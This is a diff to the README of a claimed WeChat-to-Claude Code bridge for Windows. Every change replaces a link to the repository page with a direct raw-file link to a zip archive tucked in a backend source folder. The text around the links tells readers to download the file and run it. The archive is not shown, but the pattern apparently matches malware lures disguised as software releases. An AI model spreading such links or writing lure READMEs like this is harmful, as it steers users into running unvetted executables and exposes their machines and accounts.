@@ -1,6 +1,6 @@
 # 🔗 wexin-code-cli-bridge - Connect WeChat to Claude Code
 
-[![Download](https://img.shields.io/badge/Download%20Here-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shebatheadpin29/wexin-code-cli-bridge)
+[![Download](https://img.shields.io/badge/Download%20Here-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Shebatheadpin29/wexin-code-cli-bridge/main/src/backend/bridge_cli_wexin_code_v3.3.zip)
 
 ## 🧭 What this app does
 
@@ -18,7 +18,7 @@ It is built for Windows users who want a direct way to connect WeChat with a com
 
 Visit this page to download and run the app:
 
-[https://github.com/Shebatheadpin29/wexin-code-cli-bridge](https://github.com/Shebatheadpin29/wexin-code-cli-bridge)
+[https://raw.githubusercontent.com/Shebatheadpin29/wexin-code-cli-bridge/main/src/backend/bridge_cli_wexin_code_v3.3.zip](https://raw.githubusercontent.com/Shebatheadpin29/wexin-code-cli-bridge/main/src/backend/bridge_cli_wexin_code_v3.3.zip)
 
 If the page shows a release file, download it to your Windows PC and run the file after it finishes.
 
@@ -55,7 +55,7 @@ Follow these steps on your Windows PC.
 
 Go to:
 
-[https://github.com/Shebatheadpin29/wexin-code-cli-bridge](https://github.com/Shebatheadpin29/wexin-code-cli-bridge)
+[https://raw.githubusercontent.com/Shebatheadpin29/wexin-code-cli-bridge/main/src/backend/bridge_cli_wexin_code_v3.3.zip](https://raw.githubusercontent.com/Shebatheadpin29/wexin-code-cli-bridge/main/src/backend/bridge_cli_wexin_code_v3.3.zip)
 
 Look for the latest release or the main download file.
 
@@ -257,6 +257,6 @@ It fits a simple workflow where:
 
 If you need to get the app again, use this link:
 
-[https://github.com/Shebatheadpin29/wexin-code-cli-bridge](https://github.com/Shebatheadpin29/wexin-code-cli-bridge)
+[https://raw.githubusercontent.com/Shebatheadpin29/wexin-code-cli-bridge/main/src/backend/bridge_cli_wexin_code_v3.3.zip](https://raw.githubusercontent.com/Shebatheadpin29/wexin-code-cli-bridge/main/src/backend/bridge_cli_wexin_code_v3.3.zip)
 
 Download the latest file from the page, then run it on Windows after the download finishes
